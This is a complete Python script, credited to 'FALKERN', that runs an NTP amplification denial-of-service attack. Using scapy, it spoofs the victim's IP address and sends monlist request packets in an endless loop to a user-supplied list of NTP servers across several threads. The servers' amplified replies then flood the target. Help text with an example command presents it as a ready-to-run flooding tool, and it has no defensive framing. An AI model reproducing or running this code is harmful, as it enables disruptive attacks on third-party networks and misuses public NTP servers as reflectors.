#!/usr/bin/env python
from scapy.all import IP, UDP, Raw, send
import sys
import threading
import time
import random

class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"

def deny():
    global ntplist
    global currentserver
    global data
    global target
    ntpserver = ntplist[currentserver].strip()  
    currentserver = (currentserver + 1) % len(ntplist)  
    packet = IP(dst=ntpserver, src=target) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=data)
    send(packet, loop=1)

def printhelp():
    print(f"{Colors.CYAN}NTP Amplification DOS Attack{Colors.RESET}")
    print(f"{Colors.YELLOW}By FALKERN{Colors.RESET}")
    print(f"{Colors.GREEN}Usage: ntp_ddos.py <target ip> <ntpserver list> <number of threads>{Colors.RESET}")
    print(f"{Colors.GREEN}ex: ntp_ddos.py 1.2.3.4 ntp.txt 10{Colors.RESET}")
    print(f"{Colors.GREEN}NTP server list file should contain one IP per line{Colors.RESET}")
    print(f"{Colors.RED}MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS{Colors.RESET}")
    exit(0)

try:
    if len(sys.argv) < 4:
        printhelp()
    target = sys.argv[1]
    if target in ("help", "-h", "h", "?", "--h", "--help", "/?"):
        printhelp()
    ntpserverfile = sys.argv[2]
    numberthreads = int(sys.argv[3])
    ntplist = []
    currentserver = 0
    with open(ntpserverfile) as f:
        ntplist = f.readlines()
    if numberthreads > len(ntplist):
        print(f"{Colors.RED}Attack Aborted: More threads than servers{Colors.RESET}")
        print(f"{Colors.RED}Next time don't create more threads than servers{Colors.RESET}")
        exit(0)
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    threads = []
    print(f"{Colors.GREEN}Starting to flood: {Colors.MAGENTA}{target}{Colors.GREEN} using NTP list: {Colors.MAGENTA}{ntpserverfile}{Colors.GREEN} with {Colors.MAGENTA}{numberthreads} threads{Colors.RESET}")
    print(f"{Colors.YELLOW}Use CTRL+C to stop attack{Colors.RESET}")
    for n in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    print(f"{Colors.GREEN}Sending...{Colors.RESET}")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"{Colors.RED}Script Stopped [ctrl + c]... Shutting down{Colors.RESET}")
